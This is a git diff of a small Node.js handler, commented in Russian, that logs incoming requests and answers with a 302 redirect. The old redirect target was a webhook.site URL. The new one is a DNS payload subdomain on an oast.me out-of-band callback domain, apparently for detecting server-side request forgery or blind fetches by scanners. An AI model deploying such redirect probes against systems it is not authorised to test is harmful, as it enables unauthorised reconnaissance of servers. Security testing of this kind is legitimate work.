@@ -1,17 +1,28 @@
 module.exports = (req, res) => {
-    // 1. Просто логируем факт запроса
-    console.log('📨 Запрос от сканера? User-Agent:', req.headers['user-agent']);
-    console.log('Время:', new Date().toISOString());
+
+    const yourDomain = 'd4tt7rkgtqkhfd7qiebggcx7ozotnwx5g.oast.me';
+    
+    // Генерируем уникальный ID для этого запроса
+    const requestId = Math.random().toString(36).substring(2, 10);
+    
+    const testType = 'dnsproof';
+    const testData = 'test';
+ 
+    const targetUrl = `http://${testType}.${testData}.${requestId}.${yourDomain}/`;
+ 
+    console.log('🔍 Время запроса:', new Date().toISOString());
+    console.log('User-Agent:', req.headers['user-agent'] || 'Не указан');
     console.log('Путь:', req.url);
+    console.log('🎯 DNS-пейлоад:', targetUrl);
+    console.log('📋 Расшифровка пейлоада:');
+    console.log('  - Тип теста:', testType);
+    console.log('  - Данные:', testData);
+    console.log('  - Request ID:', requestId);
+    console.log('  - Твой домен:', yourDomain);
     
-    const webhookUrl = 'https://webhook.site/a83dc435-713d-4591-8dbf-2c46d3405492';
-    
-    console.log('🎯 Редирект на:', webhookUrl);
-    
-    // 3. Отправляем редирект 302
     res.writeHead(302, {
-        'Location': webhookUrl,
-        'Cache-Control': 'no-store'
+        'Location': targetUrl,
+        'Cache-Control': 'no-store, no-cache, max-age=0'
     });
     res.end();
 };
